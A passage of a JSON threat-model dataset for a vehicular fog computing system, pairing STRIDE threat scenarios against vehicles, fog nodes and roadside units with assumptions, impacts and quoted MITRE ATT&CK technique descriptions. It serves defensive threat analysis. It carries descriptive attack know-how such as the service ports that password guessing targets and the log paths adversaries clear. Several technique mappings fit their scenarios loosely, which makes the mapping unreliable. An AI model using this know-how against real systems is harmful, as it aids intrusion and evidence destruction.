                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits weak authentication to access cloud services with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "Authentication mechanisms are not robust.",
                    "Role": "System Designer",
                    "Condition": "Weak or breakable authentication protocols."
                },
                {
                    "Assumption": "Multi-factor authentication is not enforced.",
                    "Role": "System Administrator",
                    "Condition": "Single-factor authentication mechanisms are used."
                }
            ],
            "Potential Impact": "Manipulation of cloud-based data and services, potentially affecting all connected vehicles.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "weak authentication",
                "cloud services",
                "credentials"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of vulnerable software on RSUs to perform actions normally restricted to admins.",
            "Assumptions": [
                {
                    "Assumption": "RSU software has known vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Failure to update RSU software to mitigate vulnerabilities."
                },
                {
                    "Assumption": "Access controls on RSUs are insufficient.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust access control measures."
                }
            ],
            "Potential Impact": "Unauthorized control over RSU functions, compromising traffic management and safety.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "rsu",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a smart vehicle's identity to send false data to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "The system does not use robust authentication for vehicle-to-fog communication.",
                    "Role": "System Administrator",
                    "Condition": "Valid if authentication is weak or nonexistent."
                },
                {
                    "Assumption": "The attacker has the capability to intercept and alter communication.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has local network access."
                },
                {
                    "Assumption": "The fog node trusts the received data without rigorous validation.",
                    "Role": "Fog Node",
                    "Condition": "Valid if data validation mechanisms are inadequate."
                }
            ],
            "Potential Impact": "Compromised data integrity and incorrect real-time decisions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "data manipulation",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A rogue RSU pretends to be a legitimate fog node to intercept and alter vehicle data.",
            "Assumptions": [
                {
                    "Assumption": "RSUs and vehicles do not use mutually authenticated communication channels.",
                    "Role": "System Designer",
                    "Condition": "Valid if mutual authentication is absent."
                },
                {
                    "Assumption": "An attacker can deploy or compromise an RSU in proximity to legitimate RSUs.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security is weak."
                },
                {
                    "Assumption": "Vehicles trust the first fog node they connect to without further checks.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if vehicle authentication protocols are inadequate."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "devices",
                "network",
                "interception",
                "MITM"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious fog node impersonates a cloud service to receive data from legitimate fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not verify cloud service identities rigorously.",
                    "Role": "System Architect",
                    "Condition": "Valid if identity verification is weak."
                },
                {
                    "Assumption": "An attacker has the capability to position their server in the communication path.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker controls network paths."
                },
                {
                    "Assumption": "Fog nodes automatically trust any entity presenting itself as a cloud service.",
                    "Role": "Fog Node",
                    "Condition": "Valid if trust mechanisms are poorly implemented."
                }
            ],
            "Potential Impact": "Sensitive data exfiltration and disruption of data flow.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "server",
                "network",
                "data exfiltration",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data sent from a vehicle to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel between vehicles and fog nodes is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption is not applied."
                },
                {
                    "Assumption": "The attacker has access to the network through which the data is transmitted.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has network access."
                },
                {
                    "Assumption": "The system does not perform end-to-end integrity checks.",
                    "Role": "System Administrator",
                    "Condition": "Valid if integrity verification is weak or missing."
                }
            ],
            "Potential Impact": "Compromised data integrity, leading to incorrect local processing and alerts.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "network",
                "interception",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to a fog node and alters stored data before it is forwarded to the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have secure access controls.",
                    "Role": "System Administrator",
                    "Condition": "Valid if access controls are weak."
                },
                {
                    "Assumption": "The attacker can gain physical or remote access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if security mechanisms are inadequate."
                },
                {
                    "Assumption": "The system trusts data sent from fog nodes to the cloud without revalidation.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if data validation is not enforced."
                }
            ],
            "Potential Impact": "Compromised data integrity and inaccurate long-term analytics.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "device",
                "storage",
                "integrity manipulation",
                "access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A rogue fog node transmits altered data to the central cloud services.",
            "Assumptions": [
                {
                    "Assumption": "There is no secure authentication between fog nodes and cloud services.",
                    "Role": "System Architect",
                    "Condition": "Valid if secure authentication is not used."
                },
                {
                    "Assumption": "The attacker controls or has planted a rogue fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not monitored for rogue nodes."
                },
                {
                    "Assumption": "Cloud services do not revalidate the integrity of incoming data.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if revalidation is not performed."
                }
            ],
            "Potential Impact": "Data integrity issues and misleading analytics.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "network",
                "device",
                "cloud",
                "integrity manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A vehicle denies sending certain data to a fog node after an incident.",
            "Assumptions": [
                {
                    "Assumption": "There are no non-repudiation mechanisms implemented in vehicle-to-fog communications.",
                    "Role": "System Developer",
                    "Condition": "Valid if non-repudiation is not enforced."
                },
                {
                    "Assumption": "An incident occurs that requires data verification.",
                    "Role": "Incident Investigator",
                    "Condition": "Valid during or after an incident."
                },
                {
                    "Assumption": "Vehicles need to log data without tampering capabilities.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if vehicle logging is susceptible to tampering."
                }
            ],
            "Potential Impact": "Disrupted legal or forensic investigations due to lack of evidence.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "device",
                "forensics",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A fog node denies processing or forwarding specific data to the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Non-repudiation logging for fog nodes is not implemented adequately.",
                    "Role": "System Developer",
                    "Condition": "Valid if non-repudiation is weak or missing."
                },
                {
                    "Assumption": "Disputes arise requiring proof of data forwarding.",
                    "Role": "Incident Investigator",
                    "Condition": "Valid during or after data disputes."
                },
                {
                    "Assumption": "Fog nodes can alter their logs or remove traces of data processing.",
                    "Role": "Fog Node",
                    "Condition": "Valid if fog node logging is insecure."
                }
            ],
            "Potential Impact": "Challenges in auditing, compliance, or incident response.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "logging",
                "device",
                "cloud processing",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A rogue RSU disputes its involvement in traffic management decisions leading to an accident.",
            "Assumptions": [
                {
                    "Assumption": "There is inadequate non-repudiation logging for RSUs.",
                    "Role": "System Developer",
                    "Condition": "Valid if RSU logging lacks non-repudiation."
                },
                {
                    "Assumption": "An accident occurs involving disputed data.",
                    "Role": "Incident Investigator",
                    "Condition": "Valid during or after an adverse event."
                },
                {
                    "Assumption": "RSUs can alter logs or remove traces of their activities.",
                    "Role": "RSU",
                    "Condition": "Valid if RSU logging is manipulable."
                }
            ],
            "Potential Impact": "Difficulties in assigning responsibility and resolving incidents.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "traffic management",
                "device",
                "responsibility",
                "incident resolution"
            ],
            "mitre_technique": {
                "name": "Disk Wipe",
                "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",
                "id": "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967",
                "technique_id": "T1561"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts and eavesdrops on vehicle-to-fog node communications.",
            "Assumptions": [
                {
                    "Assumption": "VFC system communications are not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Valid if encryption is not used."
                },
                {
                    "Assumption": "The attacker can access the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker has network access."
                },
                {
                    "Assumption": "Confidential data is transmitted over these channels.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if sensitive data is being sent."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "communication",
                "data interception",
                "confidentiality",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive vehicle data is publicly exposed due to poor data sanitization before cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not properly sanitize data before transmission to the cloud.",
                    "Role": "Fog Node",
                    "Condition": "Valid if data sanitization is inadequate."
                },
                {
                    "Assumption": "Cloud storage does not perform additional checks or sanitization.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if cloud sanitization is missing."
                },
                {
                    "Assumption": "Sensitive data includes personally identifiable information (PII).",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if PII is collected and stored."
                }
            ],
            "Potential Impact": "Exposure of PII and other sensitive data.",
            "MITRE ATT&CK Keywords": [
                "data sanitization",
                "PII exposure",
                "cloud storage",
                "data leakage",
                "confidentiality"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A rogue internal user leaks collected road condition data to competitors.",
            "Assumptions": [
                {
                    "Assumption": "Insider access control policies are weak or not enforced.",
                    "Role": "System Administrator",
